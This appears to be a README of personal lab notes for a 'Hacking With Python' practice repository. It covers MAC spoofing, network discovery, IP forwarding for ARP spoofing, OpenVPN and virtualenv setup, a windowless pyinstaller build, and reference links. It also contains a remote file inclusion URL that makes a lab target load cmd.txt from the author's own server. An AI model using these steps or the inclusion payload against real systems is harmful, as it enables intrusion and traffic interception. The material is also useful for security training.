# Hacking With Python

## Introduction

Various tests and exercises to simulate different kind of attacks with Python scripts.

## Commands

```powershell
ifconfig eth0 down
ifconfig eth0 hw ether 00:11:22:33:44:55
ifconfig etho0 up
```

```powershell
netdiscover -r <ip address network>
# get the route
route -n
```

## Kali Linux Commands

```powershell
uname -a
uname -r
Linux kali 5.10.0-kali3-amd64 #1 SMP Debian 5.10.13-1kali1 (2021-02-08) x86_64 GNU/Linux

lsb_release -a

cat /etc/os-release 

hostname -I
ip addr
```

<b>Arp Spoofing</b> 

Make portforwarding to make linux act as a router:

```powershell
echo 1 > /proc/sys/mnet/ipv4/ip_forward
```

## OpenVpn3

Install:

```powershell
# install
sudo apt update
sudo apt-get upgrade
sudo autoclean
apt-get install network-manager-openvpn network-manager-pptp network-manager-pptp-gnome network-manager-vpnc network-manager-vpnc-gnome

# connect
sudo openvpn <name-of-your-connection-pack>.ovpn
sudo openvpn flecheria.ovpn
```

## Discord

[Create Discord Server](https://support.discord.com/hc/en-us/articles/204849977-How-do-I-create-a-server-)

```powershell
pyinstaller.exe <path to the file .py> --onefile --noconsole
```

## Python VirtualEnv

```powershell
# instal virtualenv
pip install virtualenv
pip install virtualenvwrapper

# create virtualenv
virtualenv --python=python3 ~/venv/hackingpython
virtualenv --version

# activate virtualenv
source ~/venv/<env name>/bin/activate
# deactivate
deactivate

# list all virtualenv
lsvirtualenv

python -m pip install -r requirements.txt

# start python server
python3 –m http.server 9001
```

http://10.10.109.151/challenges//chall3.php?file=http://10.0.2.4:9001/cmd.txt
10.0.2.4 10.8.17.39 

## Reference

[Pythex](https://pythex.org/)  
[Python Alternatives Command](https://linuxconfig.org/how-to-change-from-default-to-alternative-python-version-on-debian-linux)  
[Windows 10 Images](https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/)  
Password Windows VM Machine: Passw0rd!  
[OpenVPN](https://www.ovpn.com/en/guides/debian)  
[OpenVPN](https://openvpn.net/vpn-software-packages/debian/)  
[OpenVPN 3](https://openvpn.net/cloud-docs/openvpn-3-client-for-linux/)
[OpenVPN](https://bobcares.com/blog/install-openvpn-client-debian/)  
[Debian Release](https://www.debian.org/releases/)  
[File Inclusion, LFI and RFI](https://medium.com/@kumarishefu.4507/try-hack-me-write-up-module-vulnerability-research-file-inclusion-aaa898210bc5)
[RequestBin](https://requestbin.com/)  
[XSS](http://google-gruyere.appspot.com/)  
[XSS Attacks](https://www.oreilly.com/library/view/xss-attacks/9780080553405/)  
[The Tangled Web](https://lcamtuf.coredump.cx/tangled/)
[Practical Doomsday](https://lcamtuf.coredump.cx/prep/)
